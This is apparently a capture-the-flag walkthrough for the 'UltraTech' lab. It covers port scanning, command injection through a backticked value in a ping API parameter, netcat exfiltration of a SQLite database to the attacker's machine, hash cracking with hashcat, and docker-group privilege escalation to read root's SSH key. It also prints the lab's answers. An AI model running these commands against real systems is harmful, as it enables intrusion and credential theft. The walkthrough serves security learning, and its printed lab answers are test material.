# UltraTech

## enumeration

```bash
nmap $IP -sV -sC -p8081
nmap $IP -sV -p- -oN nmap
```

ports:

- 8081 (Node.js)

- 31331 (Apache httpd)


### "Which software is using the port 8081"

==> **Node.js**


### "Which other non-standard port is used?"

==> **31331**


### "Which software is using this port?"

==> **Apache**


### "Which GNU/Linux distribution seems to be used?"

==> **Ubuntu**


## website
```bash
gobuster -u $IP:31331 -w /opt/wordlists/dirs/dsstorewordlist.txt # -> endpoints
```

Using Network Monitor in Browser -> $IP:8081/{ping,auth}

### "The software using the port 8081 is a REST api, how many of its routes are used by the web application?"

==> **2**


## exploitation

```bash
curl $IP:8081/ping?ip=$LOCALIP # -> output of ping command

curl $IP:8081/ping?ip='*' # -> utech.db.sqlite
```

### "There is a database lying around, what is its filename?"

==> **utech.db.sqlite**


```bash
# Terminal 1
COMMAND=`url_encode "nc $LOCALIP 1234 \< utech.db.sqlite"`
curl $IP:8081/ping?ip=\`$COMMAND\`

# Terminal 2
nc -lnvp 1234 > utech.db.sqlite

sqlite3 utech.db.sqlite
    .dump   # -> r00t:f357a0c52799563c7c7b76c1e7543a32
    .exit

echo f357a0c52799563c7c7b76c1e7543a32 > r00t.md5

hashcat -a0 -m0 -O r00t.md5 /opt/wordlists/passwords/rockyou.txt # -> n100906
```

### "What is the password associated with this hash?"

==> **n100906**


```bash
ssh r00t@$IP
# password: n100906
```

## privesc

```bash
# ssh r00t@$IP
groups # -> docker

docker images # -> bash
docker run -it -v /root:/roots bash
    cat /roots/.ssh/id_*
```

### "What are the first 9 characters of the root user's private SSH key?"

==> **MIIEogIBA**
